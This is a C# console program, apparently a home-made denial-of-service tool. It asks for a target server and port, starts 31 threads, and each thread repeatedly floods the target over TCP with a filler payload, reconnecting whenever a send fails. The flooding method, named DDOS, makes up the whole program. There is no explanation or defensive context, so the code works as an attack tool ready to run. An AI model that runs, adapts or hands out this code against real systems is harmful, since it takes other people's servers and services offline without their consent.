using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Diagnostics.Tracing;
using System.Diagnostics;
using System.Globalization;

class Program
{
    public static string? IP;
    public static int Port;
    public static int count = 0;
    public static Socket? socket;
    public static byte[] data = Encoding.UTF8.GetBytes("DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData");
    static void Main()
    {
        Console.Clear();
        bool isDomainName = false;
        string DomainPattern = @"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z0-9]{0,}$";
        Regex ymregex = new Regex(DomainPattern);
        while (!isDomainName)
        {
            Console.Write("服务器 |  Server: ");
            IP = Console.ReadLine();
            isDomainName = ymregex.IsMatch(IP);
            if (!isDomainName)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("非法地址 | Invalid input");
                Console.ResetColor();
            }
        }
        while (true)
        {
            Console.Write("端口   |  Port  : ");
            if (int.TryParse(Console.ReadLine(), out Port))
            {
                break;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("非法端口 | Invalid input");
                Console.ResetColor();
            }
        }
        for (int i = 1; i < 32; i++)
        {
            Thread t = new(DDOS);
            t.Start();
            Console.WriteLine("Thread\u0020" + i + "\u0020starts.");
        }
        while (true){Task.WaitAll();}
    }
    static async void DDOS()
    {
        socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        socket.Connect(IP, Port);
        while (true)
        {
            //Thread.Sleep(5);
            Task.Run(() =>
            {
                try
                {
                    socket.Send(data);
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("OK");
                    Console.ResetColor();
                    Console.Write("\u0020time =" + count++);
                }
                catch (Exception)
                {
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("错误: ERROR At\u0020" + count++ + "\u0020turns.");
                    Console.ResetColor();
                    socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    socket.Connect(IP, Port);
                }
                return;
            });
        }
    }
}
